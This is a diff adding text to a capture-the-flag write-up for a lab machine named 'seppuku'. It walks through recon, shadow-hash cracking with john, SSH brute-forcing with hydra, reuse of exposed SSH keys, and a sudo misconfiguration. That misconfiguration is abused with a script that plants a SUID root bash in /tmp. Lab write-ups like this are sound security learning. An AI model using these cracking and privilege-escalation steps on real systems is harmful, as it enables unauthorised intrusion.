@@ -1,7 +1,7 @@
 The machine's IP has been aliased as `seppuku`.
 
 ## Recon
-We start off by performing an initial scan for the top ports.
+We start off by performing an initial scan for the most common ports.
 
 `nmap -F seppuku`
 
@@ -40,7 +40,7 @@ and failing every time, I decided to give up on 80 for a while. Same went for
 the FTP service.
 
 After being stuck at this for quite a while, I decided to check if there were
-any more ports open (having realised I had used the `-F` option which scan only
+any more ports open (having realised I had used the `-F` option which scans only
 a few ports). However, scanning so many ports would require a lot of time, so I
 had to tweak the command line options in order to improve Nmap's performance.
 After reading the page at https://nmap.org/book/performance.html a bit, I came
@@ -144,8 +144,152 @@ Then I basically just followed the instructions.
 `unshadow secrets/passwd.txt secrets/shadow.txt > secrets/unshadow.txt`
 
 Now for bruteforcing the passwords. To make this easy, the `/secret` directory
-contained a `password.lst` file which we're supposed to use as the wordlist.
+contained a `password.lst` file which (my guess) we're supposed to use as the
+wordlist.
 
 `john --wordlist=./secrets/password.lst secrets/unshadow.txt`
 
-And `john` successfully cracked the password.
+And `john` successfully cracked the password. Now I just have to use that on the
+HTTP port. Easy peasy!
+
+.
+.
+.
+
+Perhaps I had been too confident about this,
+perhaps it was time for me to learn a lesson,
+perhaps I was on the wrong path all along
+or perhaps, this was fate itself.
+
+But... the password didn't work. Not even with ssh.
+
+## Getting In
+
+After getting stuck for quite a while, I just decided to check some writeups on
+the _Wired_ (aka Internet). There was a file `hostname`, which contained the
+machine's name. And apparently that was supposed to be a hint to try
+bruteforcing ssh with that username, the wordlist to use being the
+`password.lst` file.
+
+`hydra -o hydra/seppuku -l seppuku -P seppuku:7601/secret/password.lst seppuku ssh`
+`cat hydra/seppuku`
+```
+# Hydra v9.3 run at 2022-06-18 14:01:21 on seppuku ssh (hydra -o hydra/seppuku -l seppuku -P seppuku:7601/secret/password.lst seppuku ssh)
+[22][ssh] host: seppuku   login: seppuku   password: eeyoree
+```
+
+
+Trying to log in as `seppuku` with that password landed me to the first flag.
+Now for the privilege escalation.
+
+## Becoming r00t
+The login shell for `seppuku` had been `rbash` but that could easily be fixed by
+running another instance of `bash`.
+I often have the habit of running the `ls` command whenever I'm on the command
+line. I was doing the same here too and to my surprise, I saw the following.
+
+```
+seppuku@seppuku:~$ ls -la
+total 32
+drwxr-xr-x 3 seppuku seppuku 4096 Sep  1  2020 .
+drwxr-xr-x 5 root    root    4096 May 13  2020 ..
+-rw-r--r-- 1 seppuku seppuku  220 May 13  2020 .bash_logout
+-rw-r--r-- 1 seppuku seppuku 3526 May 13  2020 .bashrc
+drwx------ 3 seppuku seppuku 4096 May 13  2020 .gnupg
+-rw-r--r-- 1 seppuku seppuku   33 Jun 18 04:15 local.txt
+-rw-r--r-- 1 root    root      20 May 13  2020 .passwd
+-rw-r--r-- 1 seppuku seppuku  807 May 13  2020 .profile
+```
+
+There's a file called `.passwd`, and its contents make it seem like it's some
+password. I checked the users on the system, and there were two: samurai and
+tanto. I tried using that (potential) password on the users and it worked for
+the user `samurai`.
+
+I tried to check if that user had root access.
+```
+samurai@seppuku:~$ sudo ls
+[sudo] password for samurai:
+Sorry, user samurai is not allowed to execute '/usr/bin/ls' as root on seppuku.
+```
+
+Normally, I'd get a different message, but this one was different. Perhaps, I
+was allowed to run only some commands. Which commands though? After skimming
+through the `sudo(8)` man page, I found out that the `-l` flag was what I
+needed.
+```
+samurai@seppuku:~$ sudo -l
+Matching Defaults entries for samurai on seppuku:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User samurai may run the following commands on seppuku:
+    (ALL) NOPASSWD: /../../../../../../home/tanto/.cgi_bin/bin /tmp/*
+```
+
+Hmmm... We can execute any file inside that directory.
+
+```
+samurai@seppuku:~$ ls -la /home/tanto
+total 28
+drwxr-xr-x 4 tanto tanto 4096 Sep  1  2020 .
+drwxr-xr-x 5 root  root  4096 May 13  2020 ..
+-rw-r--r-- 1 tanto tanto  220 May 13  2020 .bash_logout
+-rw-r--r-- 1 tanto tanto 3526 May 13  2020 .bashrc
+drwx------ 3 tanto tanto 4096 May 13  2020 .gnupg
+-rw-r--r-- 1 tanto tanto  807 May 13  2020 .profile
+drwxr-xr-x 2 tanto tanto 4096 May 13  2020 .ssh
+samurai@seppuku:~$ mkdir /home/tanto/.cgi_bin
+mkdir: cannot create directory ‘/home/tanto/.cgi_bin’: Permission denied
+```
+
+Well, we probably need access to the `tanto` user as well.
+
+I hadn't used the `sudo -l` technique on the `seppuku` user, so let's give it a
+try:
+```
+seppuku@seppuku:~$ sudo -l
+Matching Defaults entries for seppuku on seppuku:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User seppuku may run the following commands on seppuku:
+    (ALL) NOPASSWD: /usr/bin/ln -sf /root/ /tmp/
+```
+
+Interesting. However, creating the symlink will still not allow us in the
+`/root` directory. I still need access to the `tanto` user.
+
+After getting stuck at this again, I tried to get some hints from other
+write-ups again - I hadn't read them fully before.
+
+The `/var/www/html/keys` directory contains OpenSSH identity files for,
+apparently, the `tanto` user.
+
+(At this point I am so tired that I don't even want to put any effort into
+my writing.)
+
+`ssh -i /var/www/html/keys/private tanto@localhost`
+
+This got me in. We don't know the password to the `tanto` user, though. So,
+can't use `sudo`, best I can do is create that `.cgi_bin/bin` directory and
+put some shell script in.
+
+`mkdir -p .cgi_bin && vi .cgi_bin/bin`
+
+Put the following contents in the `bin` file:
+```
+#!/usr/bin/bash
+cp /usr/bin/bash /tmp/rootbash && \
+chown root:root /tmp/rootbash && \
+chmod u+s /tmp/rootbash
+```
+
+Now go back to the `samurai` user and execute:
+`sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/*`
+
+Now we have a SUID binary called `rootbash` at `/tmp`.
+
+`/tmp/rootbash -p` 
+
+And we're root!
